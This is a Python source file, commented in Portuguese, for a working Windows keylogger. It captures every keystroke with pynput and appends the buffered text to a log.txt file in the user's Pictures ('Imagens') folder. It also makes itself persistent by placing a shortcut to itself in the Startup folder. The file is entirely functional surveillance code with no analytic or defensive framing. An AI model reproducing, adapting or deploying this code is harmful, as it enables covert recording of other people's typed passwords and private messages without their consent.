"""--------------------------------------------------------------------------"""
"""--------------------------------------------------------------------------"""
"""--------------------------------------------------------------------------"""
import os
from pynput.keyboard import Key, Listener
import win32com.client

pasta_destino = os.path.join(os.path.expanduser("~"), "Imagens") 
sendoEscrito = ''
limite = 200

def criar_pasta_destino():
    try:
        os.makedirs(pasta_destino, exist_ok=True)
        print(f'Pasta de destino criada em: {pasta_destino}')
    except Exception as e:
        print(f"Erro ao criar a pasta de destino: {e}")
        return False
    return True

def iniciar():
    executavel = os.path.abspath(__file__)

    pasta_inicializacao = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    try:
        criar_atalho(executavel, pasta_inicializacao)
    except Exception as e:
        return

def criar_atalho(origem, destino):
    shell = win32com.client.Dispatch("WScript.Shell")
    atalho = shell.CreateShortCut(os.path.join(destino, "seu_atalho.lnk"))
    atalho.Targetpath = origem
    atalho.WorkingDirectory = os.path.dirname(origem)
    atalho.save()

def escrita(tecla):
    global sendoEscrito
    global limite
    if tecla == Key.space or tecla == Key.enter:
        sendoEscrito += ' '
        if len(sendoEscrito) >= limite:
            salvarArquivo()
            sendoEscrito = ''
    elif tecla == Key.backspace:
        sendoEscrito = sendoEscrito[:-1]
    elif tecla == Key.shift_l or tecla == Key.shift_r:
        return
    else:
        sendoEscrito += str(tecla)
        if len(sendoEscrito) >= limite:
            salvarArquivo()
            sendoEscrito = ''

def salvarArquivo():
    global sendoEscrito
    try:
        nome_arquivo = os.path.join(pasta_destino, "log.txt")
        with open(nome_arquivo, 'a') as arquivo:
            arquivo.write(sendoEscrito + '\n')
        print(f'Dados salvos no arquivo: {nome_arquivo}')
    except Exception as e:
        print(f"Erro ao salvar no arquivo: {e}")

if __name__ == "__main__":
    if criar_pasta_destino():
        iniciar()

        while True:
            with Listener(on_press=escrita) as tela:
                tela.join()
"""--------------------------------------------------------------------------"""
"""--------------------------------------------------------------------------"""
"""--------------------------------------------------------------------------"""